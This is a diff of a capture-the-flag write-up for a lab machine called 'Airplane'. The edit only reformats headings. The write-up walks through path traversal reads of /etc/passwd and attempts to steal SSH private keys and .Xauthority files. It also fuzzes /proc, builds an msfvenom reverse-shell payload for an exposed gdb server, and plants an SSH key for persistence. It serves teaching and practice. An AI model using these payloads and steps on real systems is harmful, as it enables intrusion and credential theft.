@@ -11,7 +11,7 @@ The IP for my machine was `10.10.70.6`, first add it to hosts file.
 ```bash
 echo "10.10.70.6 airplane.thm" | sudo tee -a /etc/hosts
 ```
-# Enumeration
+## Enumeration
 Starting with an `nmap` scan using default scripts (`-sC`), service detection (`-sV`), and scanning all ports (`-p-`). `-oA` means output all formats, this is just so I can refer back to it easily
 ```
 nmap -sC -sV -oA airplane_scan -p- airplane.thm
@@ -21,7 +21,8 @@ We can see a number of open ports:
 - SSH running on port 22/TCP - this is almost never the intended initial target
 - X11 running on port 6048/TCP
 - HTTP running on port 8000/TCP - seems to be running a flask application, as indicated by the fingerprinting results.
-# HTTP Server Exploitation - LFI
+
+## HTTP Server Exploitation - LFI
 Navigating to `http://airplane.thm:8000`, we are presented with a site about some planes. Nothing interesting appears in the HTML source of the site (e.g. comments).
 ![Airplane.thm Site](/assets/img/airplane-thm-site.png)
 
@@ -29,11 +30,11 @@ A URL parameter called `page` is identified. This parameter seems to control wha
 ```
 http://airplane.thm:8000/?page=index.html
 ```
-## LFI - `/etc/passwd`
+### LFI - `/etc/passwd`
 This looks rife for a directory traversal attack. Before using burp intruder to fire off an LFI payload list, a basic payload is used (`../../../../../etc/passwd`) and works straight away, resulting in the contents of the machine's `/etc/passwd` file.
 > The `/etc/passwd` file on a system displays information about all users on the system - their usernames, ids, groups, login shells, etc. This file can be used to enumerate users on the system (e.g. for further compromise).
 {: .prompt-tip }
-## LFI - Stealing SSH Keys
+### LFI - Stealing SSH Keys
 The `id_rsa` file in `/home/USER/.ssh` contains a user's private key used for SSH key-based authentication. If we can exfiltrate this file then we can connect as that user via SSH.
 We don't know what user the app is running as - so we don't know what user's home directories we will be able to read. We have all the usernames, so let's just try to brute force it.
 Using `/etc/passwd` from the previous section:
@@ -47,9 +48,9 @@ In order to try and steal `id_rsa` for every user:
 3. Set the payload list to the result `users.txt` from the `cut` command.
 4. Launch attack and monitor for results with the largest length.
 Sadly, this is not yield any results. Let's move onto other services instead.
-# X11 Server, or not...
+## X11 Server, or not...
 According to `nmap` service detection, the service on port 6048/TCP is X11, which is some sort of tiling / window manager. There are various commands we can use to query this service:
-## Poking the X11 Service
+### Poking the X11 Service
 > The default port of X11 is 6000. Apparently, the `screen id` of the screen in use is `PORT` - 6000, so for us, it will be 48.
 {: .prompt-tip }
 
@@ -63,7 +64,7 @@ This command just hung and didn't do anything, perhaps because we require some a
 Upon further research, I learned that a file called `.Xauthority` in a user's home directory contains authentication information to connect to X11, similar to `~/.ssh/id_rsa`. Let's try to use our LFI to exfiltrate the `.Xauthority` file, as we did for `id_rsa` by using Burp.
 
 However sadly, once again, this did not yield anything worthwhile.
-## `/proc/` Investigation - PID Fuzzing
+### `/proc/` Investigation - PID Fuzzing
 Not convinced that this service was acting as it should, I began to question whether it was actually X11, and not some other service running on a X11-like port.
 
 The `/proc/` directory can be queried to identify information about running processes. We do not, however, know the PID (process ID) of the service running on 6048/TCP. Given that system / service PIDs are typically in the range of 1-1000, we can use our LFI vulnerability to fuzz PIDs.
@@ -119,8 +120,8 @@ Navigating through this output, I spotted the following output:
 It looks like the "X11 service" is actually a `gdb` server.
 > GDB is GNU debugger, used for debugging applications
 {: .prompt-tip }
-# Foothold
-## Uploading a Shell to remote GDB Server
+## Foothold
+### Uploading a Shell to remote GDB Server
 We can upload our own malicious binary to the remote GDB server. First, let's generate the binary using `msfvenom`
 ```zsh
 msfvenom -p linux/x64/shell_reverse_tcp \
@@ -157,7 +158,7 @@ hudson
 We are the `hudson` user - we have initial access!
 > There is no user.txt in `hudson` home directory, it's likely we need to laterally move to `carlos` first.
 > {: .prompt-tip }
-# Lateral Movement to `carlos` User
+## Lateral Movement to `carlos` User
 During some superficial enumeration of the machine, I looked for binaries with the SUID bit set using the following command:
 ```zsh
 find / -perm /4000 -type f 2>/dev/null
@@ -184,8 +185,8 @@ Now, let's get that user flag from `carlos` home directory!
 cat /home/carlos/user.txt
 eeb******************562
 ```
-# Privilege Escalation to Root
-## Shell Stabilisation - SSH
+## Privilege Escalation to Root
+### Shell Stabilisation - SSH
 There are few things that exist in this world that are worse than a raw `netcat` shell, so for the sake of sanity, let's add our SSH public key to `/home/carlos/.ssh/authorized_keys`.
 ```zsh
 echo "<CONTENTS_OF_YOUR_/HOME/USER/.SSH/ID_RSA.PUB" >> /home/carlos/.ssh/authorized_keys
@@ -196,7 +197,7 @@ ssh carlos@airplane
 ...
 carlos@airplane:~$
 ```
-## Interesting `Sudo` Permissions
+### Interesting `Sudo` Permissions
 As with any machine, I begin by running `sudo -l` to see if my user can run anything as root.
 
 Interesting, we can observe the following entry:
